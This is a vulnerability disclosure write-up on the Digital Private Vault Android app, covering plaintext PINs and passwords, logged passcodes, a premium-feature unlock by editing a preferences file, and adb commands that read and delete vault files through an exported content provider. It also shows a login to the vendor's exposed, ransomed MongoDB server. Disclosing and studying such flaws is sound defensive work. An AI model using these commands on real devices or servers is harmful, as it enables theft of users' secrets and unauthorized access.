---
title: "Digital Private Vault (APK) - Subverting an (in)secure Android vault"
date: 2023-06-29
categories: [Disclosed Vulnerabilities]
tags: [android]
description: This article presents the analysis of Digital Private Vault Android application, highlighting some bad practices and vulnerabilities in the product that can be exploited to completely subvert the purpose of the vault, finally exposing the secrets stored inside it.
toc: true
media_subpath: /assets/img/digital-private-vault/
---

### Product details
{: .no_toc }

<dl>
  <dt>Application</dt>
  <dd><a href="https://play.google.com/store/apps/details?id=com.techuz.privatevault">Digital Private Vault</a></dd>
  <dt>Official website</dt>
  <dd><a href="https://www.digitalprivatevault.com/">www.digitalprivatevault.com</a></dd>
  <dt>Company</dt>
  <dd><a href="https://www.techuz.com/">Techuz</a></dd>
  <dt>Version</dt>
  <dd>1.6</dd>
  <dt>Downloads</dt>
  <dd>10K+</dd>
  <dt>Package</dt>
  <dd>com.techuz.privatevault</dd>
  <dt>Min. Android version</dt>
  <dd>5.0 (API level 21)</dd>
</dl>

---


## Introduction

It is well known that Google Play does not verify applications uploaded to the store, making it quite common to run into apps that are supposed to ensure user security and privacy, but actually do anything but that. Some of these applications even have to be purchased or require the user to pay for the full version.

While I was looking for some of these applications, I came across Digital Private Vault.

Quoting the official description of the application:
> Digital Private Vault is a simple yet smart private photo vault app that allows you to hide all your personal data in one place. [...] Digital Private Vault will work as your vault app for your Android phone and tablet that safeguards your personal data.

Among the most important features, Digital Private Vault allows its users to store their images, videos, and notes inside multiple private areas, each one protected with a common 4-digit PIN (mmmmh...) and a folder-specific password.

![pin]({{page.screenshots}}sc1.png){: width="220" }{: .left }
![dashboard]({{page.screenshots}}sc2.png){: width="220" }{: .left }
![albums]({{page.screenshots}}sc3.png){: width="220" }{: .normal }

It is also important to notice that some features are currently broken because the back-end server (52.15.243.62) has been compromised at some point in the past [^shodan] but never repaired:

[^shodan]: [Shodan - 52.15.243.62:27017](https://www.shodan.io/host/52.15.243.62#27017)

```bash
$ mongo 52.15.243.62      
MongoDB shell version v6.0.1
connecting to: mongodb://52.15.243.62:27017/test?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("0b3b883d-448b-4246-bd95-6b4b060a4c16") }
MongoDB server version: 4.0.12
...
> show dbs;
READ__ME_TO_RECOVER_YOUR_DATA  0.000GB
admin                          0.000GB
angularfullstack               0.000GB
config                         0.000GB
> use READ__ME_TO_RECOVER_YOUR_DATA
switched to db READ__ME_TO_RECOVER_YOUR_DATA
> show collections;
README
> db.README.find()
{ "_id" : ObjectId("6488e1bdcfa44d6e4a22abf2"), 
"content" : "All your data was backed up. You need to email us at rambler+1rhcl@onionmail.org to recover your data. 
(more information: go to https://cutt.ly/recdb1) ALLWAYS CHECK YOUR SPAM FOLDER! OR YOU MAY MISS OUR MAILS
If you dont answer we will leak and expose all your data and in 48hs delete it forever from our server." 
}
```

## Information gathering

The application has been tested using a rooted Android 10 emulator (read *How to set up an Android Penetration Testing Lab from scratch* [^setup] for more details about the configuration).

[^setup]: [Android Hacking - How to set up an Android Penetration Testing Lab from scratch]({{site.url}}/writeups/Android%20Hacking/Android%20Pentesting%20Lab/)

```bash
.\sdkmanager.bat --install "system-images;android-29;google_apis;x86"
.\avdmanager.bat --verbose create avd --force --name "generic_api29_google_apis_emulator" --package "system-images;android-29;google_apis;x86" --tag "google_apis" --abi "x86"
.\emulator.exe -avd generic_28
```

To get a quick overview of the application, we scanned the APK with MobSF [^mobsf], which reported the following high-level summary with lots of other details:

![mobsf]({{page.screenshots}}mobsf1.png)


[^mobsf]: [Mobile Security Framework](https://github.com/MobSF/Mobile-Security-Framework-MobSF)

By decompiling the application with jadx-gui [^jadx-gui] we noticed that the source code was not obfuscated at all, helping us a lot with the analysis.

[^jadx-gui]: [Dex to Java decompiler](https://github.com/skylot/jadx)

![jadx-gui]({{page.screenshots}}code1.png)

### AndroidManifest.xml

From the `AndroidManifest.xml` file we can extract some very interesting information (detected also with MobSF).

- The application uses clear-text traffic:

```xml
<application android:theme="@style/AppTheme" 
... android:name="com.techuz.privatevault.PrivateVaultApp" android:allowBackup="false" 
... android:usesCleartextTraffic="true" ... >
```

![clear-text1]({{page.screenshots}}clear-text1.png)
*MobSF finding*

- There are two components explicitly exported [^android-exported]:

[^android-exported]: [`android:exported`](https://developer.android.com/topic/security/risks/android-exported)

```xml
<provider android:name="com.techuz.privatevault.widget.ContentProviders.MyFileContentProvider" 
android:enabled="true" android:exported="true" android:authorities="com.techuz.privatevault"/>
...
<activity android:name="com.facebook.CustomTabActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="fbconnect" android:host="cct.com.techuz.privatevault"/>
    </intent-filter>
</activity>
```
![exported-activities]({{page.screenshots}}exported-activities.png)
*MobSF finding*

- There is one component implicity exported [^implicit-intent]:

[^implicit-intent]: [Receiving an implicit intent](https://developer.android.com/guide/components/intents-filters)

```xml
<receiver android:name="com.techuz.privatevault.service.MyBroadcastReceiver">
    <intent-filter>
        <action android:name="serviceEnds"/>
    </intent-filter>
</receiver>
```
![broadcast-receiver]({{page.screenshots}}broadcast-receiver.png)
*MobSF finding*

### Internal folder structure

The initial folder structure immediately after installing the application is as follows:
```bash
generic_x86:/ ## ls -al /data/data/com.techuz.privatevault/
total 44
drwx------   4 u0_a155 u0_a155       4096 2023-06-13 14:34 .
drwxrwx--x 182 system  system        8192 2023-06-13 14:34 ..
drwxrws--x   2 u0_a155 u0_a155_cache 4096 2023-06-13 14:34 cache
drwxrws--x   2 u0_a155 u0_a155_cache 4096 2023-06-13 14:34 code_cache
lrwxrwxrwx   1 root    root            70 2023-06-13 14:34 lib -> /data/app/com.techuz.privatevault-m5oxNSMIZSbq3NXMMvdXFg==/lib/x86

generic_x86:/data/data/com.techuz.privatevault ## find
.
./cache
./code_cache
./lib
```

After starting the application for the first time and setting up email and pin, the folder structure becomes the one below:
```bash
generic_x86:/ ## ls -al /data/data/com.techuz.privatevault/
total 68
drwx------   7 u0_a155 u0_a155       4096 2023-06-13 14:36 .
drwxrwx--x 182 system  system        8192 2023-06-13 14:34 ..
drwxrws--x   2 u0_a155 u0_a155_cache 4096 2023-06-13 14:34 cache
drwxrws--x   2 u0_a155 u0_a155_cache 4096 2023-06-13 14:34 code_cache
drwxrwx--x   2 u0_a155 u0_a155       4096 2023-06-13 14:36 databases
drwxrwx--x   3 u0_a155 u0_a155       4096 2023-06-13 14:36 files
lrwxrwxrwx   1 root    root            70 2023-06-13 14:34 lib -> /data/app/com.techuz.privatevault-m5oxNSMIZSbq3NXMMvdXFg==/lib/x86
drwxrwx--x   2 u0_a155 u0_a155       4096 2023-06-13 14:36 shared_prefs

generic_x86:/data/data/com.techuz.privatevault ## find
.
./cache
./code_cache
./lib
./files
./files/.com.google.firebase.crashlytics
./files/.com.google.firebase.crashlytics/log-files
./files/.com.google.firebase.crashlytics/log-files/crashlytics-userlog-648862BF028B0001300D8713FF69C011.temp
./files/.com.google.firebase.crashlytics/report-persistence
./files/.com.google.firebase.crashlytics/report-persistence/sessions
./files/.com.google.firebase.crashlytics/report-persistence/sessions/648862BF028B0001300D8713FF69C011
./files/.com.google.firebase.crashlytics/report-persistence/sessions/648862BF028B0001300D8713FF69C011/report
./files/.com.google.firebase.crashlytics/report-persistence/sessions/648862BF028B0001300D8713FF69C011/start-time
./files/.com.google.firebase.crashlytics/com.crashlytics.settings.json
./files/generatefid.lock
./files/PersistedInstallation.W0RFRkFVTFRd+MTo1Nzk3OTA4MDI0ODM6YW5kcm9pZDozMGNkMjJjMTU4MDVjNDRlY2M5ZDQ2.json
./shared_prefs
./shared_prefs/com.facebook.sdk.appEventPreferences.xml
./shared_prefs/com.google.android.gms.measurement.prefs.xml
./shared_prefs/com.google.firebase.crashlytics.xml
./shared_prefs/FirebaseAppHeartBeat.xml
./shared_prefs/com.techuz.privatevault_preferences.xml
./shared_prefs/PV.xml
./databases
./databases/com.google.android.datatransport.events
./databases/com.google.android.datatransport.events-journal
./databases/google_app_measurement_local.db
./databases/google_app_measurement_local.db-journal
```

## Vulnerabilities

### Cleartext storage of sensitive information

{: .bug }
>The product stores sensitive information in cleartext within a resource that might be accessible to another control sphere.

The first thing I did after setting up the vault was search for hardcoded secrets inside the application folder. In our case, the PIN, the personal email, and the password were good candidates, so I started grepping for those, discovering that they are stored as they are, without any encryption or protection.

The user's email, as well as the PIN, are stored within `/shared_prefs/PV.xml`:
```bash
generic_x86:/data/data/com.techuz.privatevault ## grep -r "1234" .
./shared_prefs/PV.xml:    <string name="PASSCODE">1234</string>
generic_x86:/data/data/com.techuz.privatevault ## grep -r "0xbro.red" .
./shared_prefs/PV.xml:    <string name="PV_EMAIL">0xbro.red@yopmail.com</string>
generic_x86:/data/data/com.techuz.privatevault ## cat ./shared_prefs/PV.xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="PV_EMAIL">0xbro.red@yopmail.com</string>
    <string name="PASSCODE">1234</string>
</map>
```

Album's passwords, instead, are stored inside an SQLite database:
```bash
generic_x86:/data/data/com.techuz.privatevault ## grep -r "s3cr3t!" .
Binary file ./databases/MyDBName.db matches
1|generic_x86:/data/data/com.techuz.privatevault ## sqlite3 ./databases/MyDBName.db
SQLite version 3.22.0 2018-12-19 01:30:22
Enter ".help" for usage hints.
sqlite> .tables
Files             SubDirectory      android_metadata
Notes
sqlite> select * from SubDirectory;
1|1|Secret Album|/data/user/0/com.techuz.privatevault/app_privateVault/images/Secret Album|s3cr3t!
```

After finding out how the application saved pins and passwords, I wondered how "secret" pictures and notes were saved. I imported an image into an album, created a new note, and started searching in the same way as I did before.

The folder structure now looks like this:

```bash
generic_x86:/data/data/com.techuz.privatevault ## ls -al
total 92
drwx------  10 u0_a156 u0_a156       4096 2023-06-13 14:58 .
drwxrwx--x 182 system  system        8192 2023-06-13 14:41 ..
drwxrwx--x   4 u0_a156 u0_a156       4096 2023-06-13 14:58 app_privateVault
drwxrwx--x   2 u0_a156 u0_a156       4096 2023-06-13 14:43 app_textures
drwx------   3 u0_a156 u0_a156       4096 2023-06-13 14:43 app_webview
drwxrws--x   5 u0_a156 u0_a156_cache 4096 2023-06-13 14:58 cache
drwxrws--x   2 u0_a156 u0_a156_cache 4096 2023-06-13 14:41 code_cache
drwxrwx--x   2 u0_a156 u0_a156       4096 2023-06-13 14:58 databases
drwxrwx--x   3 u0_a156 u0_a156       4096 2023-06-13 14:43 files
lrwxrwxrwx   1 root    root            70 2023-06-13 14:41 lib -> /data/app/com.techuz.privatevault-9Z6nlf_ZcpzYg8akloQUYQ==/lib/x86
drwxrwx--x   2 u0_a156 u0_a156       4096 2023-06-13 16:11 shared_prefs
```

Photos and videos imported inside the vault are simply stored within `app_privateVault` without any kind of protection:
```bash
generic_x86:/data/data/com.techuz.privatevault ## find app_privateVault/
app_privateVault/
app_privateVault/images
app_privateVault/images/Secret Album
app_privateVault/images/Secret Album/1686661132501.jpg
app_privateVault/images/Secret Album/1686661147557.jpg
app_privateVault/images/Secret Album/1686661447174.jpg
app_privateVault/videos
```

Notes, on the other hand, are saved in the same SQLite file (`MyDBName.db`) where we found album passwords:
```bash
1|generic_x86:/data/data/com.techuz.privatevault ## grep -r secret .
Binary file ./databases/MyDBName.db matches
1|generic_x86:/data/data/com.techuz.privatevault ## sqlite3 ./databases/MyDBName.db
SQLite version 3.22.0 2018-12-19 01:30:22
Enter ".help" for usage hints.
sqlite> select * from notes;
1|Find me if you can.|This is a secret notes that should not be read by anyone|2023-06-13 03:57:17 PM
```

Looking at the `strings.xml` file, you can also find some hardcoded API key:
```bash
$ cat privateVault/res/values/strings.xml
...
<string name="google_api_key">AIzaSyDth7hjwe8p-redacted-</string>
<string name="google_app_id">1:579790802483:android:30cd22c15805c44ecc9d46</string>
<string name="google_crash_reporting_api_key">AIzaSyDth7hjwe8p-redacted-</string>
<string name="google_storage_bucket">digital-private-vault.appspot.com</string>
...
```


### Cleartext transmission of sensitive information

{: .bug }
>The product transmits sensitive or security-critical data in cleartext in a communication channel that can be sniffed by unauthorized actors.

The application allows users to get forgotten PINs or passwords through their email. That information, however, is communicated to the server using an unencrypted channel (as for all other communications to the server), exposing them to third parties.

The application first checks that the email is the same as the one used by the user during registration (stored locally inside `shared_prefs/PV.xml`):
```java
private boolean inputValidation(String email) {
    if (email.isEmpty()) {
        this.et_email.setError("Email is required");
        this.et_email.requestFocus();
        return false;
    } else if (!Patterns.EMAIL_ADDRESS.matcher(email).matches()) {
        this.et_email.setError("Invalid email");
        this.et_email.requestFocus();
        return false;
    } else if (Utility.getStringPreference(this, Constants.PREF_KEY_EMAIL, "").equals(email)) {
        return true;
    } else {
        Toast.makeText(this, "Entered email does not match to registered email", 0).show();
        return false;
    }
}
```
Then it sends the HTTP POST request to the server (52.15.243.62:3000) containing the private information within the body:
```java
public void callForgotPasswordApi(String email) {
    showProgressDialog(this);
    APIService client = getClient(Constants.BASE_URL);
    HashMap hashMap = new HashMap();
    hashMap.put("email", email);
    if (this.albumName != null && this.albumPasscode != null) {
        Log.d("AlbumName", "********** AlbumName : " + this.albumName + " **************************");
        Log.d("Passcode", "********** Passcode : " + this.albumPasscode + " **************************");
        hashMap.put("album_name", this.albumName);
        hashMap.put("passcode", this.albumPasscode);
        hashMap.put("device_name", Utility.getDeviceName());
        hashMap.put("device_os", "Android");
        try {
            hashMap.put("app_version", getPackageManager().getPackageInfo(getPackageName(), 0).versionName);
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        Log.e("", "device_name:" + Utility.getDeviceName());
        try {
            Log.e("", "app_version:" + getPackageManager().getPackageInfo(getPackageName(), 0).versionName);
        } catch (PackageManager.NameNotFoundException unused) {
        }
    } else {
        String string = getSharedPreferences(Constants.NOTIFICATION_CHANNEL_ID, 0).getString("PASSCODE", "");
        Log.d("Passcode", "********** Passcode : " + string + " **************************");
        hashMap.put("passcode", string);
        hashMap.put("device_name", Utility.getDeviceName());
        hashMap.put("device_os", "Android");
        try {
            hashMap.put("app_version", getPackageManager().getPackageInfo(getPackageName(), 0).versionName);
        } catch (PackageManager.NameNotFoundException e2) {
            e2.printStackTrace();
        }
        Log.e("", "device_name:" + Utility.getDeviceName());
        try {
            Log.e("", "app_version:" + getPackageManager().getPackageInfo(getPackageName(), 0).versionName);
        } catch (PackageManager.NameNotFoundException e3) {
            e3.printStackTrace();
        }
    }
```

The resulting HTTP request is the following one:

```http
POST /api/forgotpass HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 163
Host: 52.15.243.62:3000
Connection: close
Accept-Encoding: gzip, deflate
User-Agent: okhttp/3.12.1

device_name=Google%20Android%20SDK%20built%20for%20x86&app_version=1.6&album_name=Secret%20Album&device_os=Android&email=0xbro.red%40yopmail.com&passcode=s3cr3t%21
```
### Sensitive data leakage in log files

{: .bug }
>The application stores passwords and pins inside logs, exposing them to unathorized actors.

The application writes inside logs every HTTP request sent to the server. Because sensitive information is sent inside those requests, the same information is also stored inside logs, allowing anyone with physical access to the device to obtain them:


```bash
generic_x86:/data/data/com.techuz.privatevault/shared_prefs ## logcat | grep passcode
06-14 11:09:02.227  4067  7800 D OkHttp  : device_name=Google%20Android%20SDK%20built%20for%20x86&app_version=1.6&device_os=Android&email=0xbro.red%40yopmail.com&passcode=1234
06-14 16:45:54.337 12997 13608 D OkHttp  : device_name=Google%20Android%20SDK%20built%20for%20x86&app_version=1.6&album_name=asdf&device_os=Android&email=0xbro%40yopmail.com&passcode=asdf
```


### Premium feature unlock (insecure authorization)

{: .bug }
>The application checks whether a user is a "Pro" member from a local configuration file, which in some cases can be modified.

Some of the application's various features, such as wireless syncing or unlimited photo vault, were only available to "Pro" users. Currently, upgrading to Pro does not work anymore. However, looking at the source code, we can still find a way to "elevate" our feature pool.

By default, the application allows you to create up to 5 different albums, after which it requires you to upgrade to the pro version:

![more-albums]({{page.screenshots}}more-albums.png){: width="220" }{: .center }

Searching inside the source code for this message we end up in the `ImagesFragment` class. Here we can notice that the application checks `ImagesFragment.this.isProMember` to verify if the user is a Pro member.

```java
/* renamed from: com.techuz.privatevault.ui.fragments.ImagesFragment */
/* loaded from: classes2.dex */
public class ImagesFragment extends BaseActivity implements DirectoryAdapter.OnHideLayoutInteraction {
...
@Override // android.view.View.OnClickListener
public void onClick(View view) {
	if (ImagesFragment.this.mDirList.size() < 5 || ImagesFragment.this.isProMember) {
		// do "Pro" user reserved stuff
	}
	ImagesFragment imagesFragment = ImagesFragment.this;
	imagesFragment.showAlertDialog(imagesFragment, "Want to create more albums?", "Upgrade to pro and create unlimited albums!");
}
});
...
}
```

`ImagesFragment` extends `BaseActivity`, so we can look inside this class to understand how the value is decreed. We discover that `BaseActivity` set `isProMember` depending on `appPreferenceManager`:

```java
/* renamed from: com.techuz.privatevault.ui.activities.BaseActivity */
public class BaseActivity extends AppCompatActivity {
...
public boolean isProMember = false;
...
@Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.myPrefs = getSharedPreferences(Constants.NOTIFICATION_CHANNEL_ID, 0);
        AppPreferenceManager appPreferenceManager = new AppPreferenceManager(this);
        this.prefManager = appPreferenceManager;
        this.isProMember = appPreferenceManager.isProMember();
        this.dbHelperClass = new DbHelperClass(this);
        this.mEmailRegistrationReceiver = new EmailRegistrationReceiver();
    }
}   
```

`AppPreferenceManager` [^AppPreferenceManager] simply returns a `true`/`false` value according to what is contained within the configuration file (`shared_prefs/com.techuz.privatevault_preferences.xml`) interfacing with `mPrefs` [^mPrefs]:
```java
public class AppPreferenceManager {
...
private static final String IS_PRO_MEMBER = "isProMember";
private final SharedPreferences mPrefs;
...
public boolean isProMember() {
	return this.mPrefs.getBoolean(IS_PRO_MEMBER, false);
}
...
}
```

[^AppPreferenceManager]: [`AppPreferenceManager`](https://developer.android.com/reference/android/preference/PreferenceManager)
[^mPrefs]: [`mPrefs`](https://developer.android.com/reference/android/content/SharedPreferences)

So, to summarize: we can arbitrarily change our "membership" by editing/adding the `isProMember` field within `shared_prefs/com.techuz.privatevault_preferences.xml`, as done below (make sure to remove any cached data): 

{: .note }
>This change is only possible via a rooted device

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="IsFirstTimeLaunch" value="false" />
    <boolean name="isEmailSet" value="true" />
    <int name="total_count" value="20" />
    <boolean name="isEmailRegistered" value="false" />
    <boolean name="isRateGiven" value="true" />
    <boolean name="isProMember" value="true" />
</map>
```
![pro]({{page.screenshots}}pro.png){: width="220" }{: .left }
![pro1]({{page.screenshots}}pro1.png){: width="220" }{: .left }
![pro2]({{page.screenshots}}pro2.png){: width="220" }{: .normal }

### Arbitrary file interaction using an exported content provider

{: .bug }
>The application exports a content provider which manages private files, allowing anyone to read or delete them.

As we saw from both MobSF and the `AndroidManifest.xml` file, the application exports a content provider (`MyFileContentProvider`) which can be used by anyone:

```xml
<provider android:name="com.techuz.privatevault.widget.ContentProviders.MyFileContentProvider" 
android:enabled="true" android:exported="true" android:authorities="com.techuz.privatevault"/>
```

The `MyFileContentProvider` class exposes the `content://com.techuz.privatevault/` interface and extends `ContentProvider` [^ContentProvider].

[^ContentProvider]: [`ContentProvider`](https://developer.android.com/reference/android/content/ContentProvider)

```java
public class MyFileContentProvider extends ContentProvider {
    public static final Uri CONTENT_URI = Uri.parse("content://com.techuz.privatevault/");
    private static final HashMap<String, String> MIME_TYPES;
    public static String PATH;
    Context mContext;
...
```

The class also overrides many different functions derived from `ContentProvider`, providing a custom implementation for some of them and "disabling" others:
```java
@Override // android.content.ContentProvider
    public boolean onCreate() {
        return true;
    }

...

@Override // android.content.ContentProvider
public String getType(Uri uri) {
    String uri2 = uri.toString();
    for (String str : MIME_TYPES.keySet()) {
        if (uri2.endsWith(str)) {
            return MIME_TYPES.get(str);
        }
    }
    return null;
}

@Override // android.content.ContentProvider
public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    File file;
    if (uri.getPath() != null && !uri.getPath().isEmpty() && !uri.getPath().equals("/")) {
        file = new File(uri.getPath());
    } else {
        file = new File(PATH);
    }
    if (file.exists()) {
        return ParcelFileDescriptor.open(file, C1099C.ENCODING_PCM_32BIT);
    }
    throw new FileNotFoundException(uri.getPath());
}

@Override // android.content.ContentProvider
public Cursor query(Uri url, String[] projection, String selection, String[] selectionArgs, String sort) {
    throw new RuntimeException("Operation not supported");
}

@Override // android.content.ContentProvider
public Uri insert(Uri uri, ContentValues initialValues) {
    throw new RuntimeException("Operation not supported");
}

@Override // android.content.ContentProvider
public int update(Uri uri, ContentValues values, String where, String[] whereArgs) {
    throw new RuntimeException("Operation not supported");
}

@Override // android.content.ContentProvider
public int delete(Uri uri, String where, String[] whereArgs) {
    new File(uri.getPath()).delete();
    this.mContext.getContentResolver().notifyChange(uri, null);
    return 1;
}
```

We can interact with every overridden method, but because both `delete()` and `openFile()` has a custom and useful logic, those are the one we are more interested in. Using `adb shell content` we can communicate with both methods and because the provider is exported and there are no security measures in place, we can use them to read and delete arbitrary files stored within `/data/data/com.techuz.privatevault`.

```bash
PS > .\platform-tools\adb.exe shell ls /data/data/com.techuz.privatevault/shared_prefs
...
PV.xml
...
PS > .\platform-tools\adb.exe shell content read --uri content://com.techuz.privatevault/data/data/com.techuz.privatevault/shared_prefs/PV.xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="PV_EMAIL">0xbro@yopmail.com</string>
    <string name="PASSCODE">0000</string>
</map>
PS > .\platform-tools\adb.exe shell content delete --uri content://com.techuz.privatevault/data/data/com.techuz.privatevault/shared_prefs/PV.xml

## even if we get an error, the file is still deleted
Error while accessing provider:com.techuz.privatevault
java.lang.NullPointerException: Attempt to invoke virtual method 'android.content.ContentResolver android.content.Context.getContentResolver()' on a null object reference
        at android.os.Parcel.createException(Parcel.java:2077)
        at android.os.Parcel.readException(Parcel.java:2039)
        at android.database.DatabaseUtils.readExceptionFromParcel(DatabaseUtils.java:188)
        at android.database.DatabaseUtils.readExceptionFromParcel(DatabaseUtils.java:140)
        at android.content.ContentProviderProxy.delete(ContentProviderNative.java:553)
        at com.android.commands.content.Content$DeleteCommand.onExecute(Content.java:525)
        at com.android.commands.content.Content$Command.execute(Content.java:469)
        at com.android.commands.content.Content.main(Content.java:690)
        at com.android.internal.os.RuntimeInit.nativeFinishInit(Native Method)
        at com.android.internal.os.RuntimeInit.main(RuntimeInit.java:338)
PS > .\platform-tools\adb.exe shell content read --uri content://com.techuz.privatevault/data/data/com.techuz.privatevault/shared_prefs/PV.xml
Error while accessing provider:com.techuz.privatevault
java.io.FileNotFoundException: /data/data/com.techuz.privatevault/shared_prefs/PV.xml
        at android.database.DatabaseUtils.readExceptionWithFileNotFoundExceptionFromParcel(DatabaseUtils.java:149)
        at android.content.ContentProviderProxy.openFile(ContentProviderNative.java:604)
        at com.android.commands.content.Content$ReadCommand.onExecute(Content.java:587)
        at com.android.commands.content.Content$Command.execute(Content.java:469)
        at com.android.commands.content.Content.main(Content.java:690)
        at com.android.internal.os.RuntimeInit.nativeFinishInit(Native Method)
        at com.android.internal.os.RuntimeInit.main(RuntimeInit.java:338)
```

In this way we can retrieve pins, passwords and any other secrets hidden by the application.

### Other general misconfiguration

Other than the vulnerabilities we listed above, the application has many other misconfigurations and bugs that do not pose a real threat to the application/user but still allow unintended actions to take place.

The exported `MyBroadcastReceiver`, for example, can be used to send customized download notifications to the user:

```java
public class MyBroadcastReceiver extends BroadcastReceiver {
    ...
    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        int intExtra = intent.getIntExtra("numCallbacks", -1);
        String stringExtra = intent.getStringExtra("notificationTitle");
        String stringExtra2 = intent.getStringExtra("notificationMessage");
        if (intExtra == 0) {
            boolean booleanExtra = intent.getBooleanExtra("serviceRunningForImages", false);
            this.serviceWorkingForImages = booleanExtra;
            if (booleanExtra && isInImagesActivity) {
                ...
            } else if (!booleanExtra && isInVideosActivity) {
                ...
            } else {
                this.serviceWorkingForImages = false;
                showDownLoadComplete(context, stringExtra, stringExtra2);
            }
        }
    ...
    void showDownLoadComplete(Context context, String title, String message) {
        NotificationCompat.Builder priority = new NotificationCompat.Builder(context, this.channelID).setSmallIcon(17301634).setContentTitle(title).setContentText(message).setSubText("You can view files now").setWhen(System.currentTimeMillis()).setAutoCancel(true).setDefaults(-1).setPriority(1);
        NotificationManager notificationManager = (NotificationManager) context.getSystemService("notification");
        if (Build.VERSION.SDK_INT >= 26) {
            notificationManager.createNotificationChannel(new NotificationChannel(this.channelID, this.channelName, 4));
        }
        notificationManager.notify(1, priority.build());
    }
```
We only have to interact with the correct intent (`serviceEnds`) and send every required parameter:

```bash
PS > .\platform-tools\adb.exe shell am broadcast -n com.techuz.privatevault/com.techuz.privatevault.service.MyBroadcastReceiver -a serviceEnds --ei numCallbacks 0 --ez serviceRunningForImages true --es notificationTitle "Scam" --es notificationMessage "0xbro-was-here"
Broadcasting: Intent { act=serviceEnds flg=0x400000 cmp=com.techuz.privatevault/.service.MyBroadcastReceiver (has extras) }
Broadcast completed: result=0
```

![notification]({{page.screenshots}}notification.png){: width="250" }{: .center }


## Conclusion

A vault should securely protect our data and secrets from prying eyes and unwanted access. However, this does not apply to Digital Private Vault, whose operation - already insecure due to the absence of encryption - can be subverted entirely in such a way as to retrieve every content stored in the vault. 

This is neither the first nor the last of the insecure vaults, but this should make us consider to who we entrust our secrets and how they manage and guard them. There will probably be many other similar applications with the same problems out there, whose owners are unaware that their data are not safe.

Secrets managed by the vault should never be stored in clear-text [^storage]. Ideally, they should be encrypted and, even better, managed by a backend instead of saved locally (especially passwords, pins, and decryption keys) [^password]. Those secrets should also never be logged [^log]. The content provider should not be exported, and strict controls should be implemented on the types of files retrieved through it. It is also recommended to implement some mechanisms for certificate pinning [^pinning], root detection, emulation detection, and code obfuscation in order to make application analysis more difficult.

[^pinning]: [Pinning Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Pinning_Cheat_Sheet.html)
[^password]: [Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
[^storage]: [Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)
[^log]: [Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)


### Disclosure Timeline
> *Please refer to the <a href="{{site.url}}/disclosures/policy/">disclosure policy</a> page for further details about the disclosure policy adopted by 0xbro.*<br>

- **05/04/2023**: Identification of the vulnerabilities.
- **06/04/2023**: Contacted Digital Private Vault for the first time but didn't received any response.
- **21/04/2023**: Contacted Digital Private Vault the second time, without receiving any response.
- **03/05/2023**: Contacted Techuz and Digital Private Vault for the third and last time, without receiving any response.
- **29/06/2023**: Public release.

---
